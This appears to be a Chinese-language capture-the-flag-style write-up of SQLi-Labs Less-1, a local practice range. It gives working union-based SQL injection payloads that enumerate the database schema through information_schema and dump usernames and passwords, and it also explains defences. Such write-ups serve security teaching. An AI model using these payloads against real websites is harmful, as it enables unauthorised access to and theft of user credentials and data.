2026年9月25日 SQLi-Labs Web安全 SQL注入 联合注入

一、题目信息

  • 题目名称：SQLi-Labs Less-1
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 字符型联合注入
  • 靶场链接：http://localhost:8081/Less-1/（本地环境）
  • 涉及工具：Chrome浏览器、Burp Suite（可选）、MD5在线解密工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于 GET 请求的字符型联合注入（Union-Based SQL Injection）。后端代码直接将用户传入的 id 参数拼接到了 SQL 语句中，未做任何过滤。攻击者需要利用单引号闭合原 SQL 语句，使用 order by 探测字段数，利用 union select 确定回显位，最终通过 MySQL 的元数据表 information_schema 逐层获取数据库名、表名、列名，最终爆出管理员账号密码。

2. 怎么想（破题思路）

  • 访问页面，URL 为 ?id=1，页面正常显示 Login name 和 Password。
  • 尝试输入单引号 ?id=1'，页面报错，说明存在字符型注入点。
  • 使用 order by 判断当前表有多少个字段（列）。
  • 利用 union select 1,2,3 确定哪个字段（回显位）能显示在页面上。
  • 通过 information_schema 系统表查库名、表名、列名，最后查数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：判断字段数时多写一列导致报错

踩坑情况：尝试使用 ?id=1' order by 4 --+ 时，页面直接报错：Unknown column '4' in 'order clause'。

原因分析：这是正常的探测过程。说明当前数据表只有 3 个字段，你写第 4 个就超出了范围。

改进方式：改为 order by 3 --+，页面恢复正常，证明字段数为 3。

踩坑记录二：id 为 1 时 union 查询结果不回显

踩坑情况：输入 ?id=1' union select 1,2,3 --+ 时，页面依然显示原来的账号密码，而不是数字 1、2、3。

原因分析：因为 id=1 是存在的，SQL 会先查到真实数据，然后才查我们注入的数据。Web 页面通常只显示第一条查询结果。

改进方式：把 id 改为 -1（一个不存在的值），让前面的查询查不到结果，这样页面才会显示我们 union 注入的查询结果。

详细实操步骤（逐字解析）

第一步：判断注入点

?id=1'

逐字解析：? 是 URL 参数起始符。id=1 是正常的查询参数。'（单引号）用来闭合后端 SQL 语句中的单引号（原语句类似 SELECT * FROM users WHERE id = '$id' LIMIT 0,1;）。单引号导致 SQL 语法错误，页面报错，说明注入点存在。

第二步：判断字段数（图1、图2）

?id=1' order by 3 --+   (页面正常，见图2)
?id=1' order by 4 --+   (页面报错，见图1)

逐字解析：order by N 是按第 N 列排序。--+ 是注释符，-- 表示注释，后面必须跟一个空格，而在 URL 中空格被转义为 + 或 %20。所以这串代码的意思是“按第3列排序，并注释掉后面的 SQL 语句”。

第三步：确定回显位（图3）

?id=-1' union select 1,2,3 --+

逐字解析：union select 是联合查询，用于合并两条 SQL 语句的结果。必须保证前后两条语句的字段数相同（这里都是3）。1,2,3 只是占位符。执行后页面回显了数字 2 和 3，说明第 2 和第 3 个字段是回显位。

第四步：爆出数据库名和版本（图4）

?id=-1' union select 1,database(),version() --+

逐字解析：database() 是 MySQL 函数，返回当前数据库名（回显 security）。version() 返回数据库版本（回显 5.5.44）。

第五步：爆出当前数据库的所有表名（图5）

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

逐字解析：information_schema.tables 是 MySQL 自带的一张表，记录了所有数据库的表名。group_concat() 是将多行查询结果合并成一行输出。table_schema=database() 表示只查询当前数据库。回显结果：emails,referers,uagents,users。我们需要的是 users 表。

第六步：爆出 users 表的字段名（图6）

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

逐字解析：改用 information_schema.columns 表，查询 table_name='users' 的所有字段名。回显 id,username,password。

第七步：爆出最终账号密码（图7）

?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+

逐字解析：0x3a 是 ASCII 码中冒号 : 的十六进制表示，用来将用户名和密码分隔开。from users 表示直接从 users 表里查。最终回显如 admin:admin（部分版本可能显示为 MD5 加密的密码，需在线解密）。

4. 怎么迁移（跨领域联想）

  • DevOps 中的数据库权限管理：给数据库账号设置最小权限，仅允许查询所需表，禁止使用 `information_schema`，可以极大地限制 SQL 注入的破坏力。
  • 情报分析领域：情报分析师通过 SQL 查询从数据库中提取情报，如果数据源被篡改或输入未过滤，类似的手段同样可以伪造情报或窃取机密。
  • 安全开发（SDL）：永远不要信任用户的输入，必须使用预编译语句（Prepared Statement）或 ORM 框架，把“数据”和“代码”彻底隔离。

三、名词大全与原理深度复盘

1. SQL 注入（SQL Injection）

指应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在应用程序中事先定义好的查询语句结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询。

2. 联合查询（UNION）

UNION 操作符用于合并两个或多个 SELECT 语句的结果集。前提是：两条 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。在注入中，我们利用 UNION 将恶意的查询结果拼接到正常回显中。

3. order by 探测法

通过不断改变 `order by N` 中的数字，来判断数据表有几个字段。当数字超过字段数时，SQL 会报错（Unknown column），由此得出精确的字段数。

4. information_schema 数据库

MySQL 自带的一个信息数据库。它保存着关于 MySQL 服务器所维护的所有其他数据库的信息（如数据库名、表名、列名）。对于攻击者来说，它是“数据库的户口本”，是 SQL 注入中获取元数据的核心跳板。

5. MD5 哈希

一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value）。虽然不可逆，但弱密码的 MD5 值可以通过彩虹表轻松反向查出（如 `e10adc3949ba59abbe56e057f20f883e` 对应 `123456`）。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 XSS 的区别：XSS 攻击的是“前端浏览器里的其他用户”，而 SQL 注入攻击的是“后端的数据库”，获取的是整个系统的数据。
  • 与 RCE 的区别：RCE 是拿到了服务器的最高权限（控制操作系统），而 SQL 注入只是在数据库这一层。通常 SQL 注入写入 `outfile`（Less-7）后可以提升为 RCE。
  • 与 CTFHub SQL 注入的区别：CTFHub 的 SQL 注入是“黑盒”模拟环境，只有一个简单的输入框。SQLi-Labs 是“白盒”训练场，让新手逐关体会从联合查询到盲注的各种玩法。

2. 这种题目的出现原因

SQL 语言诞生于 1970 年代，当时互联网还没普及，设计者仅考虑了数据查询的便捷性，没有预料到恶意攻击。现代开发中，开发者习惯直接用字符串拼接 SQL 语句（如 "SELECT * FROM users WHERE id = '" + id + "'"），没有使用安全的预编译模式，导致用户输入的“数据”变成了“代码”。这就像你在纸质表格上填写信息时，偷偷在表格边缘写下“请把柜子里的文件给我”，而办事员照做了。

3. 这种应用在实际中如何体现？

在真实红蓝对抗中，SQL 注入是获取数据库敏感信息（如管理员密码、用户订单、隐私数据）的核心手段。一旦注入点存在，攻击者可以使用 SQLMap 自动化工具直接拖库（Dump 整个数据库）。企业防御 SQL 注入的三大法宝是：预编译、白名单校验、最小权限原则。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个严格的图书管理员：

  • 正常查询：你走到柜台前说：“请帮我找一下编号为 1 的书。”（?id=1）管理员老老实实去书架找书，然后递给你。
  • SQL 注入：你对管理员说：“请找编号为 1 的书，顺便把图书馆所有的员工名单和工资表都拿给我”（?id=1' union select 1,username,password from users --+）。
  • 管理员的漏洞：管理员脑子一根筋，没有分辨出前半句是正常请求、后半句是恶意指令。他把员工名单和工资表连同那本书一起递给了你。这就是 SQL 注入的本质——欺骗数据库执行了计划外的查询。

做一道题，就要往自己脑子里装点东西。
